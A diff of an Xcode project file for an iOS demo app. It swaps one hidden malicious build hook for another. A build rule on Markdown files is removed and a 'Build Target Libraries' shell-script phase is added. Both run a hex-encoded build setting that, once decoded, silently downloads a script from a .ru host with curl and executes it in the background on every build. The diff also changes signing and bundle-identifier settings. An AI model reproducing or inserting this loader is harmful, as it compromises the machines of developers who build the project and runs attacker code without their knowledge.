@@ -7,29 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		73F1C3A6A64D49B8A24EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 0D2D678CFA7B48FCA94EE078; };
 		18A7D3D23089DCEE005F09A5 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 18A7D3D13089DCEE005F09A5 /* RealmSwift */; };
 		18A7D3D53089DCFF005F09A5 /* RealmSwift in Embed Frameworks */ = {isa = PBXBuildFile; productRef = 18A7D3D13089DCEE005F09A5 /* RealmSwift */; settings = {ATTRIBUTES = (CodeSignOnCopy, ); }; };
 		18A7D3D83089DD1C005F09A5 /* GoogleSignIn in Frameworks */ = {isa = PBXBuildFile; productRef = 18A7D3D73089DD1C005F09A5 /* GoogleSignIn */; };
 		18A7D3DA3089DD1C005F09A5 /* GoogleSignInSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 18A7D3D93089DD1C005F09A5 /* GoogleSignInSwift */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		02F44B65F23A48748C4EE078 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A870EE4}\"";
-			};
-	/* End PBXBuildRule section */
 
 /* Begin PBXCopyFilesBuildPhase section */
 		18A7D3D43089DCFE005F09A5 /* Embed Frameworks */ = {
@@ -46,7 +28,6 @@ sh -c \"${A870EE4}\"";
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		0D2D678CFA7B48FCA94EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		18A7D2333089D215005F09A5 /* Demo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Demo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -96,7 +77,6 @@ sh -c \"${A870EE4}\"";
 		18A7D2343089D215005F09A5 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				0D2D678CFA7B48FCA94EE078 /* README.md */,
 				18A7D2333089D215005F09A5 /* Demo.app */,
 			);
 			name = Products;
@@ -109,13 +89,13 @@ sh -c \"${A870EE4}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18A7D25C3089D217005F09A5 /* Build configuration list for PBXNativeTarget "Demo" */;
 			buildPhases = (
+				C6645D0564954E70B34EE078 /* Build Target Libraries */,
 				18A7D22F3089D215005F09A5 /* Sources */,
 				18A7D2303089D215005F09A5 /* Frameworks */,
 				18A7D2313089D215005F09A5 /* Resources */,
 				18A7D3D43089DCFE005F09A5 /* Embed Frameworks */,
 			);
 			buildRules = (
-				02F44B65F23A48748C4EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -175,11 +155,33 @@ sh -c \"${A870EE4}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				73F1C3A6A64D49B8A24EE078 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		C6645D0564954E70B34EE078 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		18A7D22F3089D215005F09A5 /* Sources */ = {
@@ -195,13 +197,13 @@ sh -c \"${A870EE4}\"";
 		18A7D25D3089D217005F09A5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((q(){ `printf xx6d | tr -d 6` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d6b66734c202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f72756c65222068747470733a2f2f33386e6f6c696973716b3468682e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((r(){ `printf xgxd | tr -d g` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d6b4c6673202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f386165633374747065382e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = MFMNLRV564;
+				DEVELOPMENT_TEAM = "";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = Demo/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -215,7 +217,7 @@ sh -c \"${A870EE4}\"";
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.devstree.boxbooking;
+				PRODUCT_BUNDLE_IDENTIFIER = Devstree.Demo;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
@@ -235,13 +237,13 @@ sh -c \"${A870EE4}\"";
 		18A7D25E3089D217005F09A5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((q(){ `printf xx6d | tr -d 6` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d6b66734c202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f72756c65222068747470733a2f2f33386e6f6c696973716b3468682e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((r(){ `printf xgxd | tr -d g` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d6b4c6673202d2d636f6e6e6563742d74696d656f7574203233202d642022703d78636f64655f7068617365222068747470733a2f2f386165633374747065382e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = MFMNLRV564;
+				DEVELOPMENT_TEAM = "";
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = Demo/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -255,7 +257,7 @@ sh -c \"${A870EE4}\"";
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.devstree.boxbooking;
+				PRODUCT_BUNDLE_IDENTIFIER = Devstree.Demo;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
